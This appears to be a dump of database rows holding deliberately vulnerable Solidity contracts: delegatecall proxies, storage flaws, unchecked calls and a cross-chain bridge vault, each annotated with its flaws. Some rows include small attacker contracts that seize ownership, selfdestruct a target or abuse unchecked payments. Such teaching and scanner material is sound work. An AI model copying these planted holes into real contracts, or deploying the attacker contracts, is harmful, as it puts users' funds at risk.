(bool success, ) = token.call(\n            abi.encodeWithSignature("transfer(address,uint256)", _recipient, _amount)\n        );\n        require(success, "Transfer failed");\n    }\n}\n	\N	168	f	\N	1	0	solidity	0.8.0	{"license": "MIT", "detection_method": "extension", "detection_confidence": 0.95}	scanned	2025-10-17 21:33:51.059915+00	2025-10-17 21:34:18.509924+00
526f3007-70d4-4bf2-a53e-2d99ead52669	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	Delegate Call	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Delegatecall Vulnerability Examples\n * @dev VULNERABLE - DO NOT USE IN PRODUCTION\n *\n * Delegatecall executes code in the context of the calling contract,\n * which can lead to storage collision and unauthorized access.\n */\ncontract VulnerableProxy {\n    address public owner;  // Slot 0\n    address public implementation;  // Slot 1\n\n    constructor(address _implementation) {\n        owner = msg.sender;\n        implementation = _implementation;\n    }\n\n    // VULNERABLE: Unprotected delegatecall\n    function forward(bytes memory _data) public {\n        // VULNERABILITY: Anyone can delegatecall to any contract\n        // Malicious contract can overwrite storage slots\n        (bool success, ) = implementation.delegatecall(_data);\n        require(success, "Delegatecall failed");\n    }\n\n    // VULNERABLE: Delegatecall to user-supplied address\n    function execute(address _target, bytes memory _data) public {\n        // VULNERABILITY: User controls the target contract\n        (bool success, ) = _target.delegatecall(_data);\n        require(success, "Execution failed");\n    }\n}\n\n/**\n * @title Malicious Implementation\n * @dev Contract designed to exploit delegatecall vulnerability\n */\ncontract MaliciousImplementation {\n    address public owner;  // Slot 0 - will overwrite VulnerableProxy.owner\n    address public implementation;  // Slot 1\n\n    // This function will overwrite the owner in VulnerableProxy\n    function becomeOwner() public {\n        owner = msg.sender;\n    }\n\n    function destroy() public {\n        selfdestruct(payable(msg.sender));\n    }\n}\n\n/**\n * @title Storage Collision Vulnerability\n * @dev Shows how storage layout mismatches cause vulnerabilities\n */\ncontract VulnerableWallet {\n    address public owner;  // Slot 0\n    mapping(address => uint256) public balances;  // Slot 1\n    address public libAddress;  // Slot 2\n\n    constructor(address _libAddress) {\n        owner = msg.sender;\n        libAddress = _libAddress;\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    // VULNERABLE: Delegatecall to library with different storage layout\n    function withdraw(uint256 _amount) public {\n        // VULNERABILITY: If library has different storage layout,\n        // it can corrupt this contract's storage\n        (bool success, ) = libAddress.delegatecall(\n            abi.encodeWithSignature("withdraw(uint256)", _amount)\n        );\n        require(success, "Withdrawal failed");\n    }\n\n    fallback() external payable {\n        // VULNERABLE: Fallback forwards all calls to library\n        (bool success, ) = libAddress.delegatecall(msg.data);\n        require(success, "Fallback failed");\n    }\n}\n\n/**\n * @title Malicious Library\n * @dev Library with different storage layout that exploits the wallet\n */\ncontract MaliciousLibrary {\n    address public maliciousOwner;  // Slot 0 - will overwrite VulnerableWallet.owner\n\n    function withdraw(uint256 _amount) public {\n        // This actually changes the owner!\n        maliciousOwner = msg.sender;\n        // Could also send funds to attacker\n    }\n\n    function setOwner(address _newOwner) public {\n        maliciousOwner = _newOwner;\n    }\n}\n\n/**\n * @title Delegatecall with Selfdestruct\n * @dev Shows how delegatecall can be used to destroy a contract\n */\ncontract VulnerableRegistry {\n    mapping(address => bool) public registered;\n    address public logicContract;\n\n    constructor(address _logicContract) {\n        logicContract = _logicContract;\n    }\n\n    function register() public {\n        registered[msg.sender] = true;\n    }\n\n    // VULNERABLE: If logic contract has selfdestruct, this contract can be destroyed\n    function executeLogic(bytes memory _data) public {\n        (bool success, ) = logicContract.delegatecall(_data);\n        require(success, "Logic execution failed");\n    }\n}\n\n/**\n * @title Malicious Logic with Selfdestruct\n * @dev Contract that can destroy the calling contract\n */\ncontract MaliciousLogic {\n    function destroy(address payable _recipient) public {\n        // When called via delegatecall, this destroys the calling contract!\n        selfdestruct(_recipient);\n    }\n}\n\n/**\n * @title Uninitialized Proxy\n * @dev Shows initialization vulnerability in proxy pattern\n */\ncontract UninitializedProxy {\n    address public implementation;\n    address public owner;\n    bool public initialized;\n\n    // VULNERABLE: Constructor doesn't initialize properly\n    constructor(address _implementation) {\n        implementation = _implementation;\n        // Missing: initialized = true and owner = msg.sender\n    }\n\n    // VULNERABLE: Can be called by anyone if not initialized\n    function initialize(address _owner) public {\n        require(!initialized, "Already initialized");\n        owner = _owner;\n        initialized = true;\n    }\n\n    fallback() external payable {\n        (bool success, ) = implementation.delegatecall(msg.data);\n        require(success, "Delegatecall failed");\n    }\n}\n	\N	167	f	\N	1	0	solidity	0.8.0	{"license": "MIT", "detection_method": "extension", "detection_confidence": 0.95}	scanned	2025-10-17 21:35:31.735647+00	2025-10-17 21:35:51.463832+00
0e2ea42e-a14d-446a-a193-04a3fbefbd6c	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	Uninitialized Storage	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n\n/**\n * @title Uninitialized Storage Pointer Vulnerability Example\n * @dev VULNERABLE - DO NOT USE IN PRODUCTION\n *\n * This vulnerability was more prevalent in older Solidity versions (< 0.5.0)\n * where storage pointers could be uninitialized, pointing to slot 0.\n *\n * In Solidity 0.5.0+, this produces a compiler warning/error, but the\n * vulnerability can still occur with improper struct usage.\n */\ncontract VulnerableStorage {\n    address public owner;  // Slot 0\n    uint256 public totalSupply;  // Slot 1\n    mapping(address => uint256) public balances;  // Slot 2\n\n    struct User {\n        address addr;\n        uint256 balance;\n        bool active;\n    }\n\n    User[] public users;\n\n    constructor() {\n        owner = msg.sender;\n        totalSupply = 1000000;\n    }\n\n    // VULNERABLE: Uninitialized struct in memory defaults to storage slot 0\n    function addUser(address _addr, uint256 _balance) public {\n        // In older Solidity, this would point to slot 0 (owner)\n        User memory newUser;\n        newUser.addr = _addr;\n        newUser.balance = _balance;\n        newUser.active = true;\n\n        users.push(newUser);\n    }\n\n    // VULNERABLE: Array manipulation without proper bounds checking\n    function updateUser(uint256 _index, address _addr) public {\n        // VULNERABILITY: No bounds checking\n        User storage user = users[_index];\n        user.addr = _addr;\n    }\n}\n\n/**\n * @title Uninitialized Storage in Loop\n * @dev Shows vulnerability with storage pointers in loops\n */\ncontract VulnerableArray {\n    address public owner;\n    uint256 public value;\n\n    struct Item {\n        address owner;\n        uint256 amount;\n    }\n\n    Item[] public items;\n\n    constructor() {\n        owner = msg.sender;\n        value = 100;\n    }\n\n    // VULNERABLE: Storage pointer in loop\n    function processItems() public {\n        // VULNERABILITY: If items array is empty, this could cause issues\n        for (uint256 i = 0; i < items.length; i++) {\n            Item storage item = items[i];\n            // In certain conditions, this could access wrong storage slots\n            item.amount += 10;\n        }\n    }\n\n    function addItem(address _owner, uint256 _amount) public {\n        items.push(Item(_owner, _amount));\n    }\n}\n\n/**\n * @title Default Visibility Vulnerability\n * @dev Shows how default visibility can cause security issues\n */\ncontract VulnerableVisibility {\n    address owner;  // Default internal visibility in Solidity 0.5.0+, public before\n    uint256 secret;  // Default internal\n\n    constructor() {\n        owner = msg.sender;\n        secret = 12345;\n    }\n\n    // VULNERABLE: State variable with implicit visibility\n    // In older versions, this would be public by default\n\n    // VULNERABLE: Function without explicit visibility (pre 0.5.0 defaults to public)\n    function changeOwner(address _newOwner) public {\n        // In Solidity < 0.5.0, forgetting 'public' keyword made this public anyway\n        owner = _newOwner;\n    }\n\n    // VULNERABLE: This should probably be internal or private\n    function resetSecret() public {\n        secret = 0;\n    }\n}\n\n/**\n * @title Uninitialized Storage Pointer Exploit Example\n * @dev Historic vulnerability showing storage collision\n */\ncontract StorageCollision {\n    address public owner;  // Slot 0\n    uint256 public balance;  // Slot 1\n\n    struct Transaction {\n        address recipient;\n        uint256 amount;\n    }\n\n    Transaction[] public transactions;\n\n    constructor() {\n        owner = msg.sender;\n        balance = 1000;\n    }\n\n    // VULNERABLE: In Solidity < 0.5.0, uninitialized storage pointers\n    // could overwrite critical state variables\n    function createTransaction(address _recipient, uint256 _amount) public {\n        // Old vulnerability: This could point to slot 0 and overwrite owner\n        Transaction memory txn;\n        txn.recipient = _recipient;\n        txn.amount = _amount;\n        transactions.push(txn);\n    }\n}\n\n/**\n * @title Delete Mapping Vulnerability\n * @dev Shows that deleting a struct with mappings doesn't clear the mapping\n */\ncontract VulnerableMapping {\n    struct User {\n        uint256 id;\n        mapping(address => uint256) approvals;\n    }\n\n    mapping(address => User) public users;\n\n    function createUser(uint256 _id) public {\n        users[msg.sender].id = _id;\n    }\n\n    function approve(address _spender, uint256 _amount) public {\n        users[msg.sender].approvals[_spender] = _amount;\n    }\n\n    // VULNERABLE: Delete doesn't clear nested mappings\n    function deleteUser() public {\n        // VULNERABILITY: The approvals mapping is NOT deleted\n        // _spender can still access their approval even after user is "deleted"\n        delete users[msg.sender];\n    }\n\n    function getApproval(address _user, address _spender) public view returns (uint256) {\n        return users[_user].approvals[_spender];\n    }\n}\n\n/**\n * @title Storage Array Deletion\n * @dev Shows issues with deleting array elements\n */\ncontract VulnerableArrayDeletion {\n    address public owner;\n    uint256[] public values;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function addValue(uint256 _value) public {\n        values.push(_value);\n    }\n\n    // VULNERABLE: Delete on array element leaves a gap\n    function deleteValue(uint256 _index) public {\n        require(_index < values.length, "Index out of bounds");\n        // VULNERABILITY: This sets values[_index] to 0 but doesn't remove it\n        // Array length stays the same, creating a "hole"\n        delete values[_index];\n    }\n\n    // VULNERABLE: Accessing deleted elements\n    function getValue(uint256 _index) public view returns (uint256) {\n        // Will return 0 for deleted elements, but index is still valid\n        return values[_index];\n    }\n}\n	\N	206	f	\N	1	0	solidity	0.7.6	{"license": "MIT", "detection_method": "extension", "detection_confidence": 0.95}	scanned	2025-10-17 21:36:07.223479+00	2025-10-17 22:27:30.237187+00
97970ea9-196b-4643-95e6-f1aa019bcf6f	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	Unchecked Call	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Unchecked External Call Vulnerability Example\n * @dev VULNERABLE - DO NOT USE IN PRODUCTION\n *\n * This contract fails to check return values of external calls.\n */\ncontract VulnerablePayment {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    // VULNERABLE: Unchecked low-level call\n    function withdrawUnchecked(address payable _recipient, uint256 _amount) public {\n        require(balances[msg.sender] >= _amount, "Insufficient balance");\n        balances[msg.sender] -= _amount;\n\n        // VULNERABILITY: Return value not checked\n        _recipient.call{value: _amount}("");\n        // If the call fails, the user loses their balance!\n    }\n\n    // VULNERABLE: Unchecked send\n    function withdrawWithSend(address payable _recipient, uint256 _amount) public {\n        require(balances[msg.sender] >= _amount, "Insufficient balance");\n        balances[msg.sender] -= _amount;\n\n        // VULNERABILITY: send() returns false on failure but we don't check it\n        _recipient.send(_amount);\n    }\n\n    // VULNERABLE: Multiple unchecked calls\n    function batchPayout(address payable[] memory _recipients, uint256[] memory _amounts) public {\n        require(_recipients.length == _amounts.length, "Length mismatch");\n\n        for (uint256 i = 0; i < _recipients.length; i++) {\n            // VULNERABILITY: If one call fails, the loop continues\n            _recipients[i].call{value: _amounts[i]}("");\n        }\n    }\n}\n\n/**\n * @title Unchecked External Contract Call\n * @dev Shows vulnerability with external contract interactions\n */\ninterface IExternalContract {\n    function executeAction(address user) external returns (bool);\n}\n\ncontract VulnerableIntegration {\n    IExternalContract public externalContract;\n    mapping(address => uint256) public rewards;\n\n    constructor(address _externalContract) {\n        externalContract = IExternalContract(_externalContract);\n    }\n\n    // VULNERABLE: Assumes external call succeeds\n    function claimReward() public {\n        uint256 reward = rewards[msg.sender];\n        require(reward > 0, "No reward");\n\n        // VULNERABILITY: Doesn't check return value\n        externalContract.executeAction(msg.sender);\n\n        // Reward is cleared even if external call failed\n        rewards[msg.sender] = 0;\n        payable(msg.sender).transfer(reward);\n    }\n\n    function setReward(address _user, uint256 _amount) public {\n        rewards[_user] = _amount;\n    }\n\n    receive() external payable {}\n}\n\n/**\n * @title Malicious Receiver\n * @dev Contract that always rejects payments to exploit unchecked calls\n */\ncontract MaliciousReceiver {\n    // Always rejects payments\n    receive() external payable {\n        revert("Payment rejected");\n    }\n\n    // This function can drain the VulnerablePayment contract\n    function attack(address _vulnerableContract, uint256 _amount) public {\n        VulnerablePayment vulnerable = VulnerablePayment(_vulnerableContract);\n\n        // Deposit funds\n        vulnerable.deposit{value: _amount}();\n\n        // Withdraw using unchecked call - balance will be deducted\n        // but payment will fail, and we can do it again\n        vulnerable.withdrawUnchecked(payable(address(this)), _amount);\n    }\n}\n	\N	104	f	\N	1	0	solidity	0.8.0	{"license": "MIT", "detection_method": "extension", "detection_confidence": 0.95}	scanned	2025-10-17 22:29:49.63294+00	2025-10-17 22:29:56.089651+00
39ff6067-d614-4017-8c01-896029a2729a	ab45210a-44a1-490e-bd5f-18135cdc3c91	Bridge Vault	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport "@openzeppelin/contracts/access/Ownable.sol";\nimport "@openzeppelin/contracts/security/Pausable.sol";\n\ninterface IERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n\n/**\n * @title BridgeVault\n * @dev Cross-chain bridge contract with modern vulnerabilities\n *\n * VULNERABILITIES:\n * 1. Signature replay attacks across chains\n * 2. Chain ID manipulation vulnerabilities\n * 3. Race conditions in cross-chain message verification\n * 4. Insufficient validation of bridge operators\n * 5. Time-based oracle manipulation\n * 6. Cross-chain MEV extraction\n * 7. Liquidity sandwich attacks during bridging\n * 8. Validator set manipulation\n * 9. Emergency pause bypass\n * 10. Double spending via chain reorganization\n */\ncontract BridgeVault is Ownable, Pausable {\n\n    struct BridgeRequest {\n        address user;\n        address token;\n        uint256 amount;\n        uint256 targetChain;\n        address targetAddress;\n        uint256 nonce;\n        uint256 deadline;\n        bytes32 requestHash;\n    }\n\n    struct ValidatorSignature {\n        address validator;\n        bytes signature;\n        uint256 timestamp;\n    }\n\n    // VULNERABILITY: No chain ID in mapping, allows cross-chain replay\n    mapping(bytes32 => bool) public processedRequests;\n    mapping(address => uint256) public userNonces;\n    mapping(address => bool) public validators;\n    mapping(uint256 => uint256) public chainGasLimits;\n    mapping(address => mapping(uint256 => uint256)) public userChainNonces;\n\n    // VULNERABILITY: Single admin controls validator set\n    address[] public validatorsList;\n    uint256 public requiredSignatures;\n    uint256 public constant MAX_VALIDATORS = 100;\n    uint256 public bridgeFee = 100; // 1%\n\n    // VULNERABILITY: Time-based validation window\n    uint256 public validationWindow = 300; // 5 minutes\n    uint256 public emergencyDelay = 3600; // 1 hour\n\n    // VULNERABILITY: Mutable chain configuration\n    mapping(uint256 => bool) public supportedChains;\n    mapping(uint256 => address) public chainBridgeAddresses;\n\n    event BridgeInitiated(\n        bytes32 indexed requestHash,\n        address indexed user,\n        address indexed token,\n        uint256 amount,\n        uint256 targetChain\n    );\n\n    event BridgeCompleted(\n        bytes32 indexed requestHash,\n        address indexed user,\n        uint256 amount\n    );\n\n    modifier onlyValidator() {\n        require(validators[msg.sender], "Not a validator");\n        _;\n    }\n\n    modifier validChain(uint256 chainId) {\n        require(supportedChains[chainId], "Unsupported chain");\n        _;\n    }\n\n    constructor(address[] memory _validators, uint256 _requiredSignatures) Ownable(msg.sender) {\n        require(_validators.length <= MAX_VALIDATORS, "Too many validators");\n        require(_requiredSignatures <= _validators.length, "Invalid signature requirement");\n        require(_requiredSignatures > 0, "Must require at least one signature");\n\n        for (uint256 i = 0; i < _validators.length; i++) {\n            validators[_validators[i]] = true;\n            validatorsList.push(_validators[i]);\n        }\n        requiredSignatures = _requiredSignatures;\n    }\n\n    /**\n     * @dev Initiate bridge transfer - VULNERABLE to multiple attacks\n     */\n    function initiateBridge(\n        address token,\n        uint256 amount,\n        uint256 targetChain,\n        address targetAddress,\n        uint256 deadline\n    ) external payable whenNotPaused validChain(targetChain) {\n        require(amount > 0, "Invalid amount");\n        require(deadline > block.timestamp, "Deadline passed");\n        require(targetAddress != address(0), "Invalid target address");\n\n        // VULNERABILITY: No validation of target chain bridge address\n        // VULNERABILITY: Using predictable nonce generation\n        uint256 nonce = userNonces[msg.sender]++;\n\n        // VULNERABILITY: Hash doesn't include chain ID, enabling replay attacks\n        bytes32 requestHash = keccak256(abi.encodePacked(\n            msg.sender,\n            token,\n            amount,\n            targetChain,\n            targetAddress,\n            nonce,\n            deadline\n            // Missing: block.chainid to prevent cross-chain replay\n        ));\n\n        require(!processedRequests[requestHash], "Request already processed");\n\n        // VULNERABILITY: Fee calculation susceptible to overflow/underflow\n        uint256 fee = (amount * bridgeFee) / 10000;\n        uint256 bridgeAmount = amount - fee;\n\n        // Transfer tokens to vault\n        IERC20(token).transferFrom(msg.sender, address(this), amount);\n\n        // VULNERABILITY: State update after external call\n        processedRequests[requestHash] = true;\n\n        emit BridgeInitiated(requestHash, msg.sender, token, bridgeAmount, targetChain);\n    }\n\n    /**\n     * @dev Complete bridge transfer with validator signatures - VULNERABLE\n     */\n    function completeBridge(\n        BridgeRequest calldata request,\n        ValidatorSignature[] calldata signatures\n    ) external whenNotPaused {\n        require(signatures.length >= requiredSignatures, "Insufficient signatures");\n        require(request.deadline > block.timestamp, "Request expired");\n\n        // VULNERABILITY: No verification that request came from supported chain\n        bytes32 requestHash = keccak256(abi.encodePacked(\n            request.user,\n            request.token,\n            request.amount,\n            request.targetChain,\n            request.targetAddress,\n            request.nonce,\n            request.deadline\n        ));\n\n        require(request.requestHash == requestHash, "Invalid request hash");\n        require(!processedRequests[requestHash], "Already processed");\n\n        // VULNERABILITY: Signature validation doesn't prevent replay attacks\n        address[] memory signers = new address[](signatures.length);\n        for (uint256 i = 0; i < signatures.length; i++) {\n            require(validators[signatures[i].validator], "Invalid validator");\n\n            // VULNERABILITY: No timestamp validation allows old signatures\n            require(\n                block.timestamp - signatures[i].timestamp <= validationWindow,\n                "Signature too old"\n            );\n\n            bytes32 messageHash = getMessageHash(request);\n            address signer = recoverSigner(messageHash, signatures[i].signature);\n            require(signer == signatures[i].validator, "Invalid signature");\n\n            // VULNERABILITY: No check for duplicate signers\n            signers[i] = signer;\n        }\n\n        // VULNERABILITY: State update allows reentrancy\n        processedRequests[requestHash] = true;\n\n        // VULNERABILITY: No slippage protection during token transfer\n        uint256 availableBalance = IERC20(request.token).balanceOf(address(this));\n        require(availableBalance >= request.amount, "Insufficient vault balance");\n\n        IERC20(request.token).transfer(request.targetAddress, request.amount);\n\n        emit BridgeCompleted(requestHash, request.user, request.amount);\n    }\n\n    /**\n     * @dev Emergency withdraw - VULNERABLE to admin abuse\n     */\n    function emergencyWithdraw(\n        address token,\n        uint256 amount,\n        address to\n    ) external onlyOwner {\n        // VULNERABILITY: No time lock, immediate withdrawal possible\n        // VULNERABILITY: No validation of withdrawal legitimacy\n        IERC20(token).transfer(to, amount);\n    }\n\n    /**\n     * @dev Update validator set - VULNERABLE to centralization\n     */\n    function updateValidators(\n        address[] calldata newValidators,\n        uint256 newRequiredSignatures\n    ) external onlyOwner {\n        // VULNERABILITY: Immediate validator set change without timelock\n        require(newValidators.length <= MAX_VALIDATORS, "Too many validators");\n        require(newRequiredSignatures <= newValidators.length, "Invalid requirement");\n\n        // Clear existing validators\n        for (uint256 i = 0; i < validatorsList.length; i++) {\n            validators[validatorsList[i]] = false;\n        }\n        delete validatorsList;\n\n        // VULNERABILITY: No validation of new validators\n        for (uint256 i = 0; i < newValidators.length; i++) {\n            validators[newValidators[i]] = true;\n            validatorsList.push(newValidators[i]);\n        }\n\n        requiredSignatures = newRequiredSignatures;\n    }\n\n    /**\n     * @dev Add supported chain - VULNERABLE to misconfiguration\n     */\n    function addSupportedChain(\n        uint256 chainId,\n        address bridgeAddress\n    ) external onlyOwner {\n        // VULNERABILITY: No validation of chain ID or bridge address\n        supportedChains[chainId] = true;\n        chainBridgeAddresses[chainId] = bridgeAddress;\n    }\n\n    /**\n     * @dev Update bridge fee - VULNERABLE to immediate changes\n     */\n    function updateBridgeFee(uint256 newFee) external onlyOwner {\n        // VULNERABILITY: No maximum fee limit, could be set to 100%\n        // VULNERABILITY: No timelock for fee changes\n        bridgeFee = newFee;\n    }\n\n    /**\n     * @dev Get message hash for signing\n     */\n    function getMessageHash(BridgeRequest memory request) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(\n            "\\x19Ethereum Signed Message:\\n32",\n            keccak256(abi.encode(request))\n        ));\n    }\n\n    /**\n     * @dev Recover signer from signature\n     */\n    function recoverSigner(bytes32 messageHash, bytes memory signature) public pure returns (address) {\n        require(signature.length == 65, "Invalid signature length");\n\n        bytes32 r;\n        bytes32 s;\n        uint8 v;\n\n        assembly {\n            r := mload(add(signature, 32))\n            s := mload(add(signature, 64))\n            v := byte(0, mload(add(signature, 96)))\n        }\n\n        return ecrecover(messageHash, v, r, s);\n    }\n\n    /**\n     * @dev Pause contract - VULNERABLE to admin abuse\n     */\n    function pause() external onlyOwner {\n        _pause();\n    }\n\n    /**\n     * @dev Unpause contract\n     */\n    function unpause() external onlyOwner {\n        _unpause();\n    }\n\n    /**\n     * @dev Get validator count\n     */\n    function getValidatorCount() external view returns (uint256) {\n        return validatorsList.length;\n    }\n\n    /**\n     * @dev Check if chain is supported\n     */\n    function isChainSupported(uint256 chainId) external view returns (bool) {\n        return supportedChains[chainId];\n    }\n\n    // VULNERABILITY: Fallback function accepts Ether without validation\n    receive() external payable {\n        // Could be exploited for unexpected ETH handling\n    }\n\n    // VULNERABILITY: Fallback allows arbitrary calls\n    fallback() external payable {\n        // Dangerous fallback that could be exploited\n    }\n}	\N	331	f	\N	1	0	solidity	0.8.20	{"license": "MIT", "detection_method": "extension", "detection_confidence": 0.95}	scanned	2025-10-18 01:13:27.008372+00	2025-10-18 01:14:24.463581+00
48fe8623-d7fb-40a3-90a9-1ee1ee96fd89	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	Bridge Vault	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport "@openzeppelin/contracts/access/Ownable.sol";\nimport "@openzeppelin/contracts/security/Pausable.sol";\n\ninterface IERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n\n/**\n * @title BridgeVault\n * @dev Cross-chain bridge contract with modern vulnerabilities\n *\n * VULNERABILITIES:\n * 1. Signature replay attacks across chains\n * 2. Chain ID manipulation vulnerabilities\n * 3. Race conditions in cross-chain message verification\n * 4. Insufficient validation of bridge operators\n * 5. Time-based oracle manipulation\n * 6. Cross-chain MEV extraction\n * 7. Liquidity sandwich attacks during bridging\n * 8. Validator set manipulation\n * 9. Emergency pause bypass\n * 10. Double spending via chain reorganization\n */\ncontract BridgeVault is Ownable, Pausable {\n\n    struct BridgeRequest {\n        address user;\n        address token;\n        uint256 amount;\n        uint256 targetChain;\n        address targetAddress;\n        uint256 nonce;\n        uint256 deadline;\n        bytes32 requestHash;\n    }\n\n    struct ValidatorSignature {\n        address validator;\n        bytes signature;\n        uint256 timestamp;\n    }\n\n    // VULNERABILITY: No chain ID in mapping, allows cross-chain replay\n    mapping(bytes32 => bool) public processedRequests;\n    mapping(address => uint256) public userNonces;\n    mapping(address => bool) public validators;\n    mapping(uint256 => uint256) public chainGasLimits;\n    mapping(address => mapping(uint256 => uint256)) public userChainNonces;\n\n    // VULNERABILITY: Single admin controls validator set\n    address[] public validatorsList;\n    uint256 public requiredSignatures;\n    uint256 public constant MAX_VALIDATORS = 100;\n    uint256 public bridgeFee = 100; // 1%\n\n    // VULNERABILITY: Time-based validation window\n    uint256 public validationWindow = 300; // 5 minutes\n    uint256 public emergencyDelay = 3600; // 1 hour\n\n    // VULNERABILITY: Mutable chain configuration\n    mapping(uint256 => bool) public supportedChains;\n    mapping(uint256 => address) public chainBridgeAddresses;\n\n    event BridgeInitiated(\n        bytes32 indexed requestHash,\n        address indexed user,\n        address indexed token,\n        uint256 amount,\n        uint256 targetChain\n    );\n\n    event BridgeCompleted(\n        bytes32 indexed requestHash,\n        address indexed user,\n        uint256 amount\n    );\n\n    modifier onlyValidator() {\n        require(validators[msg.sender], "Not a validator");\n        _;\n    }\n\n    modifier validChain(uint256 chainId) {\n        require(supportedChains[chainId], "Unsupported chain");\n        _;\n    }\n\n    constructor(address[] memory _validators, uint256 _requiredSignatures) Ownable(msg.sender) {\n        require(_validators.length <= MAX_VALIDATORS, "Too many validators");\n        require(_requiredSignatures <= _validators.length, "Invalid signature requirement");\n        require(_requiredSignatures > 0, "Must require at least one signature");\n\n        for (uint256 i = 0; i < _validators.length; i++) {\n            validators[_validators[i]] = true;\n            validatorsList.push(_validators[i]);\n        }\n        requiredSignatures = _requiredSignatures;\n    }\n\n    /**\n     * @dev Initiate bridge transfer - VULNERABLE to multiple attacks\n     */\n    function initiateBridge(\n        address token,\n        uint256 amount,\n        uint256 targetChain,\n        address targetAddress,\n        uint256 deadline\n    ) external payable whenNotPaused validChain(targetChain) {\n        require(amount > 0, "Invalid amount");\n        require(deadline > block.timestamp, "Deadline passed");\n        require(targetAddress != address(0), "Invalid target address");\n\n        // VULNERABILITY: No validation of target chain bridge address\n        // VULNERABILITY: Using predictable nonce generation\n        uint256 nonce = userNonces[msg.sender]++;\n\n        // VULNERABILITY: Hash doesn't include chain ID, enabling replay attacks\n        bytes32 requestHash = keccak256(abi.encodePacked(\n            msg.sender,\n            token,\n            amount,\n            targetChain,\n            targetAddress,\n            nonce,\n            deadline\n            // Missing: block.chainid to prevent cross-chain replay\n        ));\n\n        require(!processedRequests[requestHash], "Request already processed");\n\n        // VULNERABILITY: Fee calculation susceptible to overflow/underflow\n        uint256 fee = (amount * bridgeFee) / 10000;\n        uint256 bridgeAmount = amount - fee;\n\n        // Transfer tokens to vault\n        IERC20(token).transferFrom(msg.sender, address(this), amount);\n\n        // VULNERABILITY: State update after external call\n        processedRequests[requestHash] = true;\n\n        emit BridgeInitiated(requestHash, msg.sender, token, bridgeAmount, targetChain);\n    }\n\n    /**\n     * @dev Complete bridge transfer with validator signatures - VULNERABLE\n     */\n    function completeBridge(\n        BridgeRequest calldata request,\n        ValidatorSignature[] calldata signatures\n    ) external whenNotPaused {\n        require(signatures.length >= requiredSignatures, "Insufficient signatures");\n        require(request.deadline > block.timestamp, "Request expired");\n\n        // VULNERABILITY: No verification that request came from supported chain\n        bytes32 requestHash = keccak256(abi.encodePacked(\n            request.user,\n            request.token,\n            request.amount,\n            request.targetChain,\n            request.targetAddress,\n            request.nonce,\n            request.deadline\n        ));\n\n        require(request.requestHash == requestHash, "Invalid request hash");\n        require(!processedRequests[requestHash], "Already processed");\n\n        // VULNERABILITY: Signature validation doesn't prevent replay attacks\n        address[] memory signers = new address[](signatures.length);\n        for (uint256 i = 0; i < signatures.length; i++) {\n            require(validators[signatures[i].validator], "Invalid validator");\n\n            // VULNERABILITY: No timestamp validation allows old signatures\n            require(\n                block.timestamp - signatures[i].timestamp <= validationWindow,\n                "Signature too old"\n            );\n\n            bytes32 messageHash = getMessageHash(request);\n            address signer = recoverSigner(messageHash, signatures[i].signature);\n            require(signer == signatures[i].validator, "Invalid signature");\n\n            // VULNERABILITY: No check for duplicate signers\n            signers[i] = signer;\n        }\n\n        // VULNERABILITY: State update allows reentrancy\n        processedRequests[requestHash] = true;\n\n        // VULNERABILITY: No slippage protection during token transfer\n        uint256 availableBalance = IERC20(request.token).balanceOf(address(this));\n        require(availableBalance >= request.amount, "Insufficient vault balance");\n\n        IERC20(request.token).transfer(request.targetAddress, request.amount);\n\n        emit BridgeCompleted(requestHash, request.user, request.amount);\n    }\n\n    /**\n     * @dev Emergency withdraw - VULNERABLE to admin abuse\n     */\n    function emergencyWithdraw(\n        address token,\n        uint256 amount,\n        address to\n    ) external onlyOwner {\n        // VULNERABILITY: No time lock, immediate withdrawal possible\n        // VULNERABILITY: No validation of withdrawal legitimacy\n        IERC20(token).transfer(to, amount);\n    }\n\n    /**\n     * @dev Update validator set - VULNERABLE to centralization\n     */\n    function updateValidators(\n        address[] calldata newValidators,\n        uint256 newRequiredSignatures\n    ) external onlyOwner {\n        // VULNERABILITY: Immediate validator set change without timelock\n        require(newValidators.length <= MAX_VALIDATORS, "Too many validators");\n        require(newRequiredSignatures <= newValidators.length, "Invalid requirement");\n\n        // Clear existing validators\n        for (uint256 i = 0; i < validatorsList.length; i++) {\n            validators[validatorsList[i]] = false;\n        }\n        delete validatorsList;\n\n        // VULNERABILITY: No validation of new validators\n        for (uint256 i = 0; i < newValidators.length; i++) {\n            validators[newValidators[i]] = true;\n            validatorsList.push(newValidators[i]);\n        }\n\n        requiredSignatures = newRequiredSignatures;\n    }\n\n    /**\n     * @dev Add supported chain - VULNERABLE to misconfiguration\n     */\n    function addSupportedChain(\n        uint256 chainId,\n        address bridgeAddress\n    ) external onlyOwner {\n        // VULNERABILITY: No validation of chain ID or bridge address\n        supportedChains[chainId] = true;\n        chainBridgeAddresses[chainId] = bridgeAddress;\n    }\n\n    /**\n     * @dev Update bridge fee - VULNERABLE to immediate changes\n     */\n    function updateBridgeFee(uint256 newFee) external onlyOwner {\n        // VULNERABILITY: No maximum fee limit, could be set to 100%\n        // VULNERABILITY: No timelock for fee changes\n        bridgeFee = newFee;\n    }\n\n    /**\n     * @dev Get message hash for signing\n     */\n    function getMessageHash(BridgeRequest memory request) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(\n            "\\x19Ethereum Signed Message:\\n32",\n            keccak256(abi.encode(request))\n        ));\n    }\n\n    /**\n     * @dev Recover signer 